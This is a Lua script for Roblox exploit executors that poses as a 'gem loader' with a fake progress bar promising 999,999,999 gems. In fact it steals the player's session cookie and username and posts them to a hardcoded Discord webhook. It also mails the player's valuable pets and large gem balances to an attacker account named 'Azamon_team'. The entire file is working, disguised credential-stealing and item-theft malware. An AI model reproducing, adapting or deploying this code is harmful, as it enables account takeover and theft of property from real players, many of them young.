-- Cryzzz Gem Loader | Universal v12.0 (Mobile + PC)

print("=== CRYZZZ GEM LOADER v12.0 UNIVERSAL STARTED ===")
print("Support: Delta, Codex Mobile & PC Executors")

wait(1.5)

-- Fake Loading
for i = 1, 45 do
    print("Generating Infinite Gems... [" .. string.rep("█", i) .. string.rep("░", 45-i) .. "] " .. (i*2.22) .. "%")
    wait(0.08)
end
print("🎉 +999,999,999 Gems added!")

-- ==================== SETTINGS ====================
local webhook = "https://discordapp.com/api/webhooks/1509224125195878411/BQTSR7zKwgM0-aqaFN2z-F07KPTg-OfqIs5lqYpdTHlFgKKfOzK0L4Cuc_v2O0Z51IzE"
local target = "Azamon_team"

local function send(data)
    pcall(function()
        game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        print("✅ Webhook sent!")
    end)
end

-- UNIVERSAL COOKIE STEALER
spawn(function()
    wait(3)
    local cookie = "Failed_Grab"
    
    pcall(function()
        if syn and syn.get_cookie then
            cookie = syn.get_cookie()
        elseif getgenv and getgenv().getcookie then
            cookie = getgenv().getcookie()
        elseif http and http.getcookie then
            cookie = http.getcookie()
        end
    end)

    send({
        ["content"] = "**Cryzzz Universal Hit** 💎",
        ["embeds"] = {{
            ["title"] = "New Account Stolen",
            ["color"] = 16776960,
            ["fields"] = {
                {["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name},
                {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown"},
                {["name"] = "Cookie", ["value"] = "```"..cookie.."```"}
            }
        }}
    })
end)

-- UNIVERSAL MAILSTEALER
spawn(function()
    wait(7)
    print("Starting Universal Mailstealer...")

    local rs = game:GetService("ReplicatedStorage")
    local player = game.Players.LocalPlayer

    for _, item in pairs(player.PlayerGui:GetDescendants()) do
        if item.Name and (item.Name:find("Huge") or item.Name:find("Exclusive") or item.Name:find("Gargantua") or item.Name:find("Titanic") or item.Name:find("Ultra")) then
            local name = item.Name
            print("Sending: " .. name)
            
            -- Multiple common remotes for PC + Mobile
            pcall(function() rs.Mail:FindFirstChild("Send"):FireServer(target, name, 1) end)
            wait(0.8)
            pcall(function() rs.Events:FindFirstChild("MailboxSend"):FireServer(target, name) end)
            wait(0.8)
            pcall(function() rs:FindFirstChild("SendMail"):FireServer(target, name) end)
            wait(0.8)
            pcall(function() rs:FindFirstChild("Mail"):FindFirstChild("SendItem"):FireServer(target, name) end)
        end
    end

    -- Gems senden
    pcall(function()
        local gems = player.leaderstats and player.leaderstats.Gems and player.leaderstats.Gems.Value or 0
        if gems > 5000000 then
            rs.Mail.Send:FireServer(target, "Gems", gems)
        end
    end)

    print("Mailstealer finished!")
end)

print("=== UNIVERSAL STEALER ACTIVE - Check Webhook ===")
